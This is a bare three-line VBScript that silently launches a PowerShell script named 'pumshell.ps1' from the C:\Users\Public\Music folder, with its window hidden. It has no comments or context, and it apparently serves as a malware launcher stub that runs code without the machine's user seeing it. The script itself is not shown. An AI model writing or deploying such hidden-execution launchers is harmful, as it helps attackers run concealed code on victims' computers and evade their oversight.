Set WShell = CreateObject("WScript.Shell")
WShell.Run "powershell.exe -WindowStyle Hidden -File C:\Users\Public\Music\pumshell.ps1", 0
Set WShell = Nothing